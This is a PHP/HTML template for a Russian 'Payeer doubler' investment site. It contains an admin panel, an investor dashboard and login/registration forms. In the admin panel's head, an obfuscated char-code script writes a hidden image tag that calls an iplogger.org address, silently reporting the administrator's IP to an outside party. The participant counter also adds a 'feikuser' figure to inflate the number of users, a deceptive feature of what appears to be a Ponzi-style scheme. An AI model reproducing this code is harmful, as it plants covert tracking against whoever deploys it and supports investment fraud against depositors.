<?
########################
# Связь с базой данных #
########################

$wallet=$db->getOne("SELECT wallet FROM ss_users WHERE id=?i",$id);
$email=$db->getOne("SELECT email FROM ss_users WHERE id=?i",$id);
$curator=$db->getOne("SELECT curator FROM ss_users WHERE id=?i",$id);
$col_refov=$db->getOne("SELECT i_have_refs_as_curator FROM ss_users WHERE id=?i",$id);
$registr=$db->getOne("SELECT reg_unix FROM ss_users WHERE id=?i",$id);
//$refk=$db->getOne("SELECT SUM(opisanie) FROM userstat WHERE type='Выплата реферальных'");
$refk_my=$db->getOne("SELECT SUM(opisanie) FROM userstat WHERE type='Выплата реферальных' AND userid=?i",$id);

$depmoney=$db->getOne("SELECT SUM(summa) FROM log WHERE comment='Пополнение баланса'");
//$depmoney=$db->getOne("SELECT SUM(summa) as depmoney FROM deposits WHERE curatorid>0");

//$depmoney_my=$db->getOne("SELECT SUM(summa) FROM log WHERE comment='Пополнение баланса' AND userid=?i",$id);
$depmoney_my=$db->getOne("SELECT SUM(summa) FROM deposits WHERE userid=?i AND curatorid!=?i",$id,0);

$wthmoney=$db->getOne("SELECT SUM(opisanie) FROM userstat WHERE type='Выплата реферальных' OR type='Выплата по депозиту'");
//$wthmoney=$db->getOne("SELECT SUM(summa) FROM deposits WHERE status=?i AND curatorid!=?i",1,0);
//$wthmoney=$wthmoney+($wthmoney*($deppercentage/100));

//$wthdep_my=$db->getOne("SELECT SUM(opisanie) FROM userstat WHERE type='Выплата по депозиту' AND userid=?i",$id); Старое
$wthdep_my=$db->getOne("SELECT SUM(summa) FROM deposits WHERE userid=?i AND status=?i AND curatorid!=?i",$id,1,0);
$wthdep_my=$wthdep_my+($wthdep_my*($deppercentage/100));

$invcount=$db->numRows($db->query("SELECT id FROM ss_users WHERE curator>0"));
//$plus_dep=$db->getOne("SELECT SUM(plus) FROM more");
//$minus_dep=$db->getOne("SELECT SUM(minus) FROM more");
$feyk=$db->getOne("SELECT SUM(feikuser) FROM more");
$data_starta=$db->getOne("SELECT start FROM more");
$vkgrup=$db->getOne("SELECT vk FROM more");
$telega=$db->getOne("SELECT telega FROM more");
$adminmail=$db->getOne("SELECT mail FROM more");

$budget=$refk_my+$wthdep_my;
if($budget<0){$budget=0;}
$refk_my=number_format($refk_my,2,'.',',');
$wthdep_my=number_format($wthdep_my,2,'.',',');
$budget=number_format($budget,2,'.',',');
$uzerov=number_format(($invcount+$feyk));
$depmoney=number_format(($depmoney),2,'.',',');
$wthmoney=number_format(($wthmoney),2,'.',',');
$refk=number_format($refk,2,'.',',');
$depmoney_my=number_format($depmoney_my,2,'.',',');
?>
<?
/*По итогу, вот список переменных, с которыми можно работать:*/

//$wallet - Кошелек инвестора (личный)
//$email - Почта инвестора (личный)
//$curator - Номер куратора (личный)
//$col_refov - Количество партнеров (личный)
//$registr - Дата регистрации инвестора (личный)
//$depmoney_my - Сколько депнуто (личный)
//$wthdep_my - Сколько выплачено по депу (личный)
//$refk_my - Сколько выплачено реферальных (личный)
//$budget - Сколько выплачено всего (личный)

//$depmoney - Сколько депнуто (всего)
//$wthmoney - Сколько выплачено реферальных и депозитных (всего)
//$uzerov - Количество участников (всего)

//$data_starta - Дата старта
//$vkgrup - Вк группа
//$telega - Телеграм
//$adminmail - Почта администрации

?>
<?if($id == (1)){?>
<!--
################
# Админ панель #
################
-->

<!DOCTYPE html>
<html lang="ru-RU">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Личный кабинет проекта <?=$sitename?></title>
<link rel="icon" href="/style/images/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="/style/plugins/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="/style/plugins/jvectormap/jquery-jvectormap-2.0.3.css"/>
<link rel="stylesheet" href="/style/css/main.css">
<link rel="stylesheet" href="/style/css/all-themes.css" />
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css" integrity="sha384-5sAR7xN1Nv6T6+dT2mhtzEpVJvfS3NScPQTrOxhwjIuvcA67KV2R5Jz6kr4abQsz" crossorigin="anonymous">
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script type="text/javascript" src="http://gostats.ru/js/counter.js"></script>  
<script type="text/javascript">_gos='c4.gostats.ru';_goa=407459;
_got=5;_goi=1;_gol='анализ сайта';_GoStatsRun();</script>
<noscript><img alt="" 
src="http://c4.gostats.ru/bin/count/a_407459/t_5/i_1/counter.png" 
style="border-width:0" /></noscript>
<script>
$(document).ready(function(){
setInterval(function(){
$('.countdown').each(function(){
var time=$(this).text().split(':');
var timestamp=time[0]*3600+ time[1]*60+ time[2]*1;timestamp-=timestamp>0;
var hours=Math.floor(timestamp/3600);
var minutes=Math.floor((timestamp- hours*3600)/ 60);
var seconds=timestamp- hours*3600- minutes*60;if(hours<10){hours='0'+ hours;}

if(minutes<10){minutes='0'+ minutes;}
if(seconds<10){seconds='0'+ seconds;}
if(timestamp>0){
$(this).text(hours+':'+ minutes+':'+ seconds);
}
});
},1000);

})
</script>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!87!70!54!50!55!34!32!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
</head>

<body class="theme-admin" style="background: #ffffff;">
<div class="page-loader-wrapper">
<div class="loader">
<div class="preloader">
<div class="spinner-layer pl-red">
<div class="circle-clipper left">
<div class="circle"></div>
</div>
<div class="circle-clipper right">
<div class="circle"></div>
</div>
</div>
</div>
<p style="color: #000;">Загрузка страницы...</p>
</div>
</div>

<div class="overlay"></div>

<nav class="navbar">
<div class="col-12">
<div class="navbar-header">            
<a href="javascript:void(0);" class="bars"></a>
<a class="navbar-brand" href="/">Админ панель</a>
</div>
<ul class="nav navbar-nav navbar-right">
<li><a href="/exit" class="mega-menu" data-close="true"><i class="zmdi zmdi-power"></i> Выход</a></li>
</ul>
</div>
</nav>

<aside id="leftsidebar" class="sidebar"> 

<div class="user-info">
<div class="image"> <img src="/style/images/avatar.jpg" width="48" height="48" alt="User" /> </div>
<div class="info-container">
<div class="name" data-toggle="dropdown"><?=$wallet?></div>
<div class="email"><?=$email?></div>
</div>
</div>

<div class="menu">
<ul class="list">
<li class="header">НАВИГАЦИЯ</li>
<li> <a href="/?page=admin_deposits"><span><i class="fas fa-business-time"></i> Депозиты</span> </a></li>
<li> <a href="/?page=admin_withdrawal"><span><i class="fas fa-hand-holding-usd"></i> Выплаты</span> </a></li>
<li> <a href="/?page=admin_users"><span><i class="fas fa-theater-masks"></i> Участники</span> </a> </li>
<li> <a href="/?page=admin_partner"><span><i class="fas fa-users"></i> Рефоводы</span> </a> </li>
<li> <a href="/?page=admin_log"><span><i class="fas fa-file-medical-alt"></i> Ошибки</span> </a> </li>
<li> <a href="/?page=admin_otheraction"><span><i class="fas fa-cogs"></i> Настройки</span> </a> </li>
<li> <a href="/?page=admin_clean"><span><i class="fab fa-cloudscale"></i> Очистка базы данных</span> </a> </li>
<li> <a href="https://vk.com/id457351861" target="_blank"><span><i class="fab fa-vk"></i> Тех.поддержка</span> </a> </li>
<li> <a href="https://t.me/StasED" target="_blank"><span><i class="fab fa-telegram-plane"></i> Тех.поддержка</span> </a> </li>
</ul>
</div>

</aside>


<section class="content home">
<div class="container-fluid">
<div class="block-header">
<div class="row">           
</div>
</div>
<div class="row clearfix">
<div class="col-lg-4 col-md-6 col-sm-12">
<div class="card widget-stat">
<div class="body">
<div class="media">
<div class="media-text">
<span class="title">Инвестировано</span>
<span class="value"><?=$depmoney?> <?=$m_curr?></span>
</div>
</div>
</div>
</div>
</div>
<div class="col-lg-4 col-md-6 col-sm-12">
<div class="card widget-stat">
<div class="body">
<div class="media">
<div class="media-text">
<span class="title">Участников</span>
<span class="value"><?=$uzerov?> ЧЕЛ.</span>
</div>
</div>
</div>
</div>
</div>
<div class="col-lg-4 col-md-6 col-sm-12">
<div class="card widget-stat">
<div class="body">
<div class="media">
<div class="media-text">
<span class="title">Выведено всего</span>
<span class="value"><?=$wthmoney?> <?=$m_curr?></span>
</div>
</div>
</div>
</div>
</div>

</div>

<?}else{?>
<?if($id > (1)){?>
<!--
#####################
# Кабинет инвестора #
#####################
-->

<!DOCTYPE html>
<html lang="ru-RU">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Личный кабинет проекта <?=$sitename?></title>
<link rel="icon" type="image/png" href="/hand.png">
<link rel="stylesheet" href="/style/plugins/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="/style/plugins/jvectormap/jquery-jvectormap-2.0.3.css"/>
<link rel="stylesheet" href="/style/css2/main.css">
<link rel="stylesheet" href="/style/animate.css">
<link rel="stylesheet" href="/style/css2/all-themes.css" />
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css" integrity="sha384-5sAR7xN1Nv6T6+dT2mhtzEpVJvfS3NScPQTrOxhwjIuvcA67KV2R5Jz6kr4abQsz" crossorigin="anonymous">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script>
$(function() {
    $("a").each(function(b) {//работа с элементом (ссылка)
        if (this.title) {
            var c = this.title;
            var x = -100;//расположение по горизонтали(left)
            var y = -105;//расположение по вертикали (top)
            $(this).mouseover(function(d) {
                this.title = "";
                $("body").append('<div id="tooltip">' + c + "</div>");
                $("#tooltip").css({
                    left: (d.pageX + x) + "px",
                    top: (d.pageY + y) + "px",
                    opacity: "0.8"//полупрозрачность
                }).show(300)//скорость появления подсказки
            }).mouseout(function() {
                this.title = c;
                $("#tooltip").remove()
            }).mousemove(function(d) {
                $("#tooltip").css({
                    left: (d.pageX + x) + "px",
                    top: (d.pageY + y) + "px"
                })
            })
        }
    })
    });
</script>
<script type="text/javascript">
<!--
function googleTranslateElementInit() {
new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
}
// -->
</script>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script>
$(document).ready(function(){
setInterval(function(){
$('.countdown').each(function(){
var time=$(this).text().split(':');
var timestamp=time[0]*3600+ time[1]*60+ time[2]*1;timestamp-=timestamp>0;
var hours=Math.floor(timestamp/3600);
var minutes=Math.floor((timestamp- hours*3600)/ 60);
var seconds=timestamp- hours*3600- minutes*60;if(hours<10){hours='0'+ hours;}

if(minutes<10){minutes='0'+ minutes;}
if(seconds<10){seconds='0'+ seconds;}
if(timestamp>0){
$(this).text(hours+':'+ minutes+':'+ seconds);
}
});
},1000);

})
</script>
</head>

<body class="theme-purple">
<div class="overlay"></div>

<nav class="navbar">
<div class="col-12">
<div class="navbar-header">            
<a href="javascript:void(0);" class="bars"></a>
<a class="navbar-brand" href="/"><?=$sitename?></a>
</div>
<ul class="nav navbar-nav navbar-right">
<li><a href="/exit" class="mega-menu" data-close="true"><i class="zmdi zmdi-power"></i> Выход</a></li>
</ul>
</div>
</nav>

<aside id="leftsidebar" class="sidebar"> 
<div class="user-info">
<div class="image"><i class="far fa-grin-tongue-wink fa-7x" style="font-size: 7em; color: #0f1434;"></i></div>
</div>


<!--lang-->
<div class="ei_lang">
<div class="lang_content">
<div class="lang_active">
<span style="color:#fff;">Язык системы</span>&nbsp;
<a href="#" onclick="doGTranslate(&#39;ru|ru&#39;);return false;" class="active"><img src="/style/images/ru.png" style="height: 21px;width: auto;" alt="RU"></a>
&nbsp;
<a href="#" onclick="doGTranslate(&#39;ru|en&#39;);return false;" class="activ"><img src="/style/images/en.png" style="height: 21px;width: auto;" alt="EN"></a>
</div>
</div>
</div>
<div id="google_translate_element2">
<div class="skiptranslate goog-te-gadget" dir="ltr" style="">
Технологии <span style="white-space:nowrap"><a class="goog-logo-link" href="https://translate.google.com/" target="_blank"><img src="" width="37px" height="14px" style="padding-right: 3px" alt="Google Переводчик">Переводчик</a></span>
</div>
</div>
<style type="text/css">

#goog-gt-tt {display:none !important;}
.goog-te-banner-frame {display:none !important;}
.goog-te-menu-value:hover {text-decoration:none !important;}
body {top:0 !important;}
#google_translate_element2 {display:none!important;}

<div>
</div>
</style>
<script type="text/javascript">
function googleTranslateElementInit2() {new google.translate.TranslateElement({pageLanguage: 'ru',autoDisplay: false}, 'google_translate_element2');}
</script>
<script type="text/javascript" src="/style/f.txt"></script>


<script type="text/javascript">
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('6 7(a,b){n{4(2.9){3 c=2.9("o");c.p(b,f,f);a.q(c)}g{3 c=2.r();a.s(\'t\'+b,c)}}u(e){}}6 h(a){4(a.8)a=a.8;4(a==\'\')v;3 b=a.w(\'|\')[1];3 c;3 d=2.x(\'y\');z(3 i=0;i<d.5;i++)4(d[i].A==\'B-C-D\')c=d[i];4(2.j(\'k\')==E||2.j(\'k\').l.5==0||c.5==0||c.l.5==0){F(6(){h(a)},G)}g{c.8=b;7(c,\'m\');7(c,\'m\')}}',43,43,'||document|var|if|length|function|GTranslateFireEvent|value|createEvent||||||true|else|doGTranslate||getElementById|google_translate_element2|innerHTML|change|try|HTMLEvents|initEvent|dispatchEvent|createEventObject|fireEvent|on|catch|return|split|getElementsByTagName|select|for|className|goog|te|combo|null|setTimeout|500'.split('|'),0,{}))
</script>
<!--fin lang-->


<div class="user-info" style="padding: 13px 15px 12px 46px;">
<div class="info-container">
<div class="email" style="padding-bottom: 5px;">Личный номер - <span class="label label-info"><?=$id?></span></div>
<?if($curator > (1)){?><div class="email">Номер Upline - <span class="label label-info" style="background: #E34924;"><?=$curator?></span></div><?}?>
</div>
</div>

<div class="menu" style="padding-bottom: 50px;">
<ul class="list" style="padding-bottom: 50px;">
<li class="header">ОСНОВНАЯ НАВИГАЦИЯ</li>
<li><a href="/newdep"><span><i class="fas fa-donate"></i> Новый депозит</span></a></li>
<li><a href="/deposits"><span><i class="fas fa-business-time"></i> Ваши депозиты</span></a></li>
<li><a href="/partners"><span><i class="fas fa-sitemap"></i> Партнеры - <?=$col_refov?> чел</span></a></li>
<li><a href="/promo"><span><i class="fas fa-bullhorn"></i> Баннера</span></a></li>
<li><a href="/comments"><span><i class="fas fa-comments"></i> Отзывы</span></a></li>
<li><a href="/support"><span><i class="fas fa-headset"></i> Тех.поддержка</span></a></li>
</ul>
</div>

</aside>

<section class="content home">
<div class="container-fluid">
<div class="block-header">
<div class="row">           
</div>
</div>

<div class="row clearfix animated flipInX">
<div class="col-lg-4 col-md-4 col-sm-6">
<div class="card widget-stat">
<div class="body">
<div class="media">
<div class="media-icon bg-cyan"><i class="fas fa-arrow-circle-down fa-3x"></i></div>
<div class="media-text">
<span class="title">Введено в проект</span>
<span class="value"><?=$depmoney_my?> <i class="fas fa-ruble-sign"></i></span>
</div>
</div>
</div>
</div>
</div>

<div class="col-lg-4 col-md-4 col-sm-6">
<div class="card widget-stat">
<div class="body">
<div class="media">
<div class="media-icon bg-cyan"><i class="fas fa-arrow-circle-up fa-3x"></i></div>
<div class="media-text">
<span class="title">Выведено из проекта</span>
<span class="value"><?=$budget?> <i class="fas fa-ruble-sign"></i></span>
</div>
</div>
</div>
</div>
</div>

<div class="col-lg-4 col-md-4 col-sm-12">
<div class="card widget-stat">
<div class="body">
<div class="media">
<div class="media-icon bg-cyan"><i class="fas fa-user fa-3x"></i></div>
<div class="media-text">
<span class="title"><?=$email?></span>
<span class="value"><i class="fas fa-wallet"></i> <?=$wallet?></span>
</div>
</div>
</div>
</div>
</div>

</div>

<?}else{?>
<!--
########################################################################
# Лучшие скрипты payeer удвоителей только здесь https://ed-script.pro/ #
########################################################################
-->
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><?=$sitename?></title>
<meta name="description" content="Инвестиционный проект <?=$sitename?>">
<meta name='author' content='Stas Danilov'>
<meta name='Copyright' content='EDscript (ed-script.pro)'>
<meta name="viewport" content="width=1280px">
<link href="/style/form.css" rel="stylesheet" type="text/css">
<link href="/style/animate.css" rel="stylesheet" type="text/css">
<link href="/style/font-awesome/css/font-awesome.min.css" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Oswald:400,700&amp;subset=cyrillic" rel="stylesheet">
<link href="/themes/css.css" rel="stylesheet">
<link rel="icon" type="image/png" href="/hand.png">
<link rel="stylesheet" type="text/css" href="/themes/style.css" media="all">
<link rel="stylesheet" type="text/css" href="/themes/stat_css.css" media="all">
<link rel="stylesheet" type="text/css" href="/themes/tarif_css.css" media="all">
<link href="/themes/rendered.css" rel="stylesheet" type="text/css">
<script src="/themes/a"></script>
</head>

<body class="noos-select-init">
<div class="dm-overlay" id="sign-in">
<div class="dm-table">
<div class="dm-cell">
<div class="dm-modal" style="max-width: 25em;line-height: normal;">
<a href="#close" class="close"></a>
<h3 style="color: #0b1115cf;font-family: 'Oswald', sans-serif;padding-left: 5px;font-size: 21px;margin-bottom: 10px;font-family: 'Oswald', sans-serif;">Форма авторизации</h3>
<div class="pl-left">
<style>
.tooltip {
position: fixed;
padding: 10px 20px;
border: 1px solid #b3c9ce;
border-radius: 4px;
text-align: center;
font: 14px/1.3 arial, sans-serif;
color: #333;
background: #fff;
box-shadow: 3px 3px 3px rgba(0, 0, 0, .3);
}
</style>

<center>
<form action="" method="post">	
<input type="hidden" name="do" value="checkaccount">
<input type="hidden" name="antipovtor" value="<?=time();?>">
<table height="21px" border="0">
<tbody>
<tr>
<td align="center">

<input autocomplete="off" name="wallet" pattern="^P[0-9]{7,14}" title="Первая буква должна быть заглавной [P] далее цифры кошелька" type="text" size="23" maxlength="35" placeholder="Введите номер PAYEER" style="font-family: 'Oswald', sans-serif;text-transform: none;width: 100%;height: 50px;background: rgba(47, 70, 87, 0) url(/img/koshel.png) no-repeat left 20px center;margin-top: 10px;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;border-radius: 4px;color: #383d40;text-align: left;padding-left: 85px;background-size: 30px;">

<input autocomplete="off" name="wallet_password" title="Пароль аккаунта" type="password" size="23" maxlength="35" placeholder="Пароль от аккаунта" style="font-family: 'Oswald', sans-serif;text-transform: none;width: 100%;height: 50px;background: rgba(47, 70, 87, 0) url(/img/password.png) no-repeat left 20px center;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;border-radius: 4px;color: #383d40;text-align: left;padding-left: 85px;background-size: 30px;">

<input type="submit" name="submit" id="form" value="ВОЙТИ НА ПРОЕКТ" class="stas">

</td>
</tr>
</tbody>
</table>
</form>
</center>

</div>
</div>
</div>
</div>
</div>

<div class="dm-overlay" id="sign-up">
<div class="dm-table">
<div class="dm-cell">
<div class="dm-modal" style="max-width: 25em;line-height: normal;">
<a href="#close" class="close"></a>
<h3 style="color: #0b1115cf;font-family: 'Oswald', sans-serif;padding-left: 5px;font-size: 21px;margin-bottom: 10px;font-family: 'Oswald', sans-serif;">Форма регистрации</h3>
<div class="pl-left">
<style>
.tooltip {
position: fixed;
padding: 10px 20px;
border: 1px solid #b3c9ce;
border-radius: 4px;
text-align: center;
font: 14px/1.3 arial, sans-serif;
color: #333;
background: #fff;
box-shadow: 3px 3px 3px rgba(0, 0, 0, .3);
}
</style>

<center>
<form action="" method="post">	
<input type="hidden" name="do" value="toaccount">
<input type="hidden" name="antipovtor" value="<?=time();?>">
<table height="21px" border="0">
<tbody>
<tr>
<td align="center">

<input autocomplete="off" name="reg_email" title="E-mail" type="text" size="23" maxlength="35" placeholder="Ваш e-mail" style="font-family: 'Oswald', sans-serif;text-transform: none;width: 99%;height: 50px;background: rgba(47, 70, 87, 0) url(/img/email.png) no-repeat left 20px center;margin-top: 10px;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;border-radius: 4px;color: #383d40;text-align: left;padding-left: 70px;background-size: 30px;">

<input autocomplete="off" name="reg_wallet" pattern="^P[0-9]{7,14}" title="Первая буква должна быть заглавной [P] далее цифры кошелька" type="text" size="23" maxlength="35" placeholder="Кошелёк payeer" style="font-family: 'Oswald', sans-serif;text-transform: none;width: 99%;height: 50px;background: rgba(47, 70, 87, 0) url(/img/koshel.png) no-repeat left 20px center;margin-top: 0px;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;border-radius: 4px;color: #383d40;text-align: left;padding-left: 70px;background-size: 30px;">

<input autocomplete="off" name="reg_password" title="Пароль аккаунта" type="password" size="23" maxlength="35" placeholder="Пароль аккаунта" style="font-family: 'Oswald', sans-serif;text-transform: none;width: 99%;height: 50px;background: rgba(47, 70, 87, 0) url(/img/password.png) no-repeat left 20px center;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;border-radius: 4px;color: #383d40;text-align: left;padding-left: 70px;background-size: 30px;">

<input autocomplete="off" name="reg_repassword" title="Повторный пароль аккаунта" type="password" size="23" maxlength="35" placeholder="Повторный пароль аккаунта" style="font-family: 'Oswald', sans-serif;text-transform: none;width: 99%;height: 50px;background: rgba(47, 70, 87, 0) url(/img/password.png) no-repeat left 20px center;margin-top: 0px;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;border-radius: 4px;color: #383d40;text-align: left;padding-left: 70px;background-size: 30px;">

<input autocomplete="off" name="captcha" type="text" size="23" maxlength="35" placeholder="Введите цифры с картинки" style="text-transform: none;width: 99%;height: 50px;background: rgba(255, 255, 255, 0) url(/secpic.php?r=<?=time()?>) no-repeat;background-size: 75px;border-left-width: 3px;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;padding-left: 85px;border-radius: 4px;color: #383d40;text-align: left;font-family: 'Oswald', sans-serif;">

<input type="submit" name="submit" id="form" value="ЗАРЕГИСТРИРОВАТЬСЯ" class="stas"><br><br>
<p style="font-family: 'Oswald', sans-serif; text-align: center; color: #949798;">У Вас нат Payeer кошелька? <a href="https://payeer.com/03967833" target="_blank"><u><span style="color: #08559c;">Зарегистрировать</span></u></a></p>
</td>

</tr>
</tbody>
</table>
</form>
</center>

</div>
</div>
</div>
</div>
</div>
<?}}?>